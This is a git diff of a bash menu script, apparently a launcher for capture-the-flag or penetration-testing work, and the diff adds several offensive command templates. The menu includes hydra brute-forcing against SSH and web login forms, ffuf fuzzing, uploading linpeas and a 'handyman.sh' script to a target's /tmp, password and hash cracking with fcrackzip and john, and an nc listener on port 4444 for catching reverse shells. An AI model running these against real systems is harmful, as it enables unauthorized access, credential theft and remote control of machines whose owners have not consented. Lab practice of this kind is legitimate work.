@@ -1,17 +1,20 @@
 #! /bin/bash
 
-COMMAND_1='nmap -sV -sC $TARGET | highlight "^2[12]\/tcp|^80\/tcp"'
-COMMAND_2='ffuf -c -recursion -t 64 -w "$W_COMMON" -u http://$TARGET/FUZZ'
+COMMAND_1='nmap -sV -sC $TARGET | highlight "^\d+\/tcp"'
+COMMAND_2='ffuf -v -c -recursion -t 64 -w "$W_COMMON" -u http://$TARGET/FUZZ'
 COMMAND_3='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $TARGET ssh -s PORT'
 COMMAND_4='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $TARGET http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
 COMMAND_5='ssh $USER@$TARGET -p 22'
 COMMAND_6='scp ~/Tools/linpeas.sh $USER@$TARGET:/tmp'
-COMMAND_7='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
-COMMAND_8='binwalk -e file.jpg'
-COMMAND_8='steghide extract -sf file.jpg'
-COMMAND_a='7z x file.zip'
-COMMAND_b='john --wordlist=$W_PASSWORD --format=FORMAT hash.txt'
-COMMAND_c='python /usr/share/john/ssh2john.py key > key.hash'
+COMMAND_7='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$TARGET/login.php -d "key=FUZZ"'
+COMMAND_8='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
+COMMAND_9='binwalk -e file.jpg'
+COMMAND_a='steghide extract -sf file.jpg'
+COMMAND_b='7z x file.zip'
+COMMAND_c='john --wordlist=$W_PASSWORD --format=FORMAT hash.txt'
+COMMAND_d='python /usr/share/john/ssh2john.py key > key.hash'
+COMMAND_e='nc -nlvp 4444'
+COMMAND_f='scp ~/Tools/handyman.sh $USER@$TARGET:/tmp'
 
 show_menus() {
   clear
@@ -30,6 +33,9 @@ show_menus() {
   echo "  a) $COMMAND_a"
   echo "  b) $COMMAND_b"
   echo "  c) $COMMAND_c"
+  echo "  d) $COMMAND_d"
+  echo "  e) $COMMAND_e"
+  echo "  f) $COMMAND_f"
   echo ""
   echo "  x. Exit"
   echo ""
@@ -93,6 +99,15 @@ read_options() {
     c) runV $COMMAND_c;;
     c-) runV $COMMAND_c;;
     c_) runH $COMMAND_c;;
+    d) runV $COMMAND_d;;
+    d-) runV $COMMAND_d;;
+    d_) runH $COMMAND_d;;
+    e) runV $COMMAND_e;;
+    e-) runV $COMMAND_e;;
+    e_) runH $COMMAND_e;;
+    f) runV $COMMAND_f;;
+    f-) runV $COMMAND_f;;
+    f_) runH $COMMAND_f;;
     x) exit 0;;
     *) echo -e "Error..."
   esac
